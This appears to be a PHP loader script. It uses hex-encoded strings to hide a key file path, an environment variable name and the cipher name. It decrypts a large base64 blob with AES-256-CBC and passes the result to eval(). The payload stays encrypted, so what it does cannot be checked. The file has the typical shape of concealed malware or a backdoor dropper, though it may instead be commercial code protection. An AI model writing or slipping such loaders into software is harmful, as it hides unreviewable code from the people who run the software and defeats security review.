<?php

$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('FGz6sCJ1+g2h+hFBMQRBwg==');

$c=base64_decode(

'WZhyHh3p4TOKkH2rm9GR9Vf+euJGVI5jwXYBfq71pA9HMNuueUb1ninbISCvceFNlDAQgQObJP5q' .
'bvavF6MZBnn6dM6EmDdh9nvoRmG+XDiNH4DhDGBYyng0JHbrNIDzBVnhzIcyTLzB6ZFB2NB5F6On' .
'xKYyzyoInrSFk/voEHJhmxz8N56T6kHM2+q/eH2gxalSeqUWz4u5/dd2FoMQXlZFouAhY7BsKRNQ' .
'Z4F7sVV8PZpVeHDt/c2LhnRGdqknzBPJBOpMWkZNwJ6WvBk5cH3eRx5vH/JLOOQ0Sl6TAhXO1sbV' .
'uNXaWhocGTRxudGPJTzBa4obeLIfu7rrJHR1KVUGi6YptUBnHPe70iGoAnvwbmbA4qjAVrb/ReIO' .
'tbmyIzkT5zqSQORBYF4ystAgHCmJYR1N5EUL9ItMvn9Tk4kRBwW7fd/oP7H0hxnd2rhqt+0gb8x7' .
'FHz83vW1k0y7kjTGI8EtsLXwkQGkGtyjVoiZ4a4wsZdlaH6ABJPMIggWsINUkovebK1EoMti1ueK' .
'kQzIZ28wAPMrusbqD4wfo2vRRWEsA7LIi6NZDmPs3kG8Jx9k1KKUU8iZ7msUxNWfmdv6HujGC7jC' .
'CoP9t/vssbMT+su94drCQ46iiFgwYtRE6gU7A3f8gaY7ZHa8mavDLUAMpqFbnoco5/2ZKwRnphMT' .
'Os/qZF7SndIrXSilO+0QA3LpKfWojY0Et8FRGl66c3m+BwXW0enCXVjzBBBItoCwk6AECT6R6Jwx' .
'FPncb4CpGIKd+DDVpvVDbosP8zmx1j74tIPCmVgtztBr1+CTwYRdmEMnUtDxk9zAK78/ZeW4KufT' .
'UH8tLZRnvQ6MYeRBB1pm+Cp4FlCXUwV5E3RcxvBUOZD/GJBAbCMoUp3bAUiIUfiOEMAL/9zfEs0E' .
'y9GHDxbMaKriVYls+hsHJ/vzTmXsxEYB00zpJfO6NYBYpr8vCAX29zHRx6qjco0ai7J0DIEMy7i0' .
'tuHn3wOyfFxsazGyqo+84cmllquU6XA6m8Yhx0R6FbZNYYMriwMDOMboqd5262JtUJM/Ch2J2vgv' .
'GW+OvWSe2IVFf1cOQ6XROK9VaYYeoNznoL4TrlI1wXEZ4wEqOScFa5GZLHhxxJuiQHmoEZpkQtsU' .
'vuoL95JD9fI34ho5rkamaK089xUylJtCc78QdMLM8/dC5Y+4z/KBUjlhyl5y8POQhJ0iq+6CtoXx' .
'U3jcW/fAPmjCDCoPsGDuBpJ/8wYjkVIyYq9gsw0IUK1/WK86ynCFuiwXT52iYC1hagJi2820OYD8' .
'43QoT9EOb2/K06pNc6tFp0QwNb+KwuvqQsNw+7TiV/v7SNn/0M0gHwiF75HCG7md6TolzHPaBPXc' .
'GfZVHHlEYbifKBckybk+uuEYirhkgjF8MsIhkeHwXWiITaA9Xw7zplcvvnHwph6R0O3Ud6Z5ZG1r' .
'pBfJXzhaj+F/Ouy1yRKTOyo1fsdDd0YGwyt/7I5w5TYnMPtE4xbe6BddxQqvWKJZUt/gREQQlh6w' .
'SVy9Vi06g84TBanZOHGH5KKk9YRrwoekaazTgY65PKoIms4CqkgnjU86KNvfRx9R12xpc+/LPua3' .
'T+TWD9d8d5ZNw03X8okbPhMfd4R40JeNsZDTiBWyNancFRkpTlLf8tQOWmv6tX3RGpqH1/NdmvFp' .
'upIwM9b4KylrMAl4RCdO7jlyWWqUe6FsprWi+3WEvGSbE/St2dktKYfFQGQ6g7wAyYiTYcAUVfam' .
'GqwaTaglz4UaFiYzQmkaf2FLaDFXGRqr8GOa1L8tnHwBOIBdqU5EyrvGtw2XEPl++dIxp59UL0c6' .
'tcZ2PG9ErK6AFb1B0AKaYiInAUAZ/p9Vu1DeP8zYq7PWUu1rIOb9aPq+3dhEhUtNR1VnFfHlrI52' .
'3IOgShozgwa3T2bps45SqbhYCEXXij3PR7XkEn68Dx1MI5boTP/RGSanIuiiIRRyxxX32Hp+XT9i' .
'LTBqIQQ2XE6kLh5wRjfCtqV1xDrlsRrrmZ7i/zZKijJJ6T9FGeH7jTEl/1xIagBKozsfO1HdAyoP' .
'5ZQ1hv2DVyBM3MBwji8bIeJCVlGnOyFZeHCbCMBHZ7w5Ff2hmWqgs/iqRXl9SaK1rfXkD7zVzxsG' .
'Vc4xwHPdAcR8Z7ZS3tbZizg2YlKRBHsBD7nij94bdcZ/bu3utz1nn7HX+F/WD1M1MI5d7S0DTbYm' .
'Bel0oGIdAmLXtZXNsxCP+X4QYJabqsx6NRHjswQ1pZ6VKOzo/szWT2bNVj2kYQePewV1k/SCLE7r' .
'Oz6CvvbokLDb71YfCyglehUWhrimHVfX6p2mqcSSVZb8Pw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval('?>'.$d);

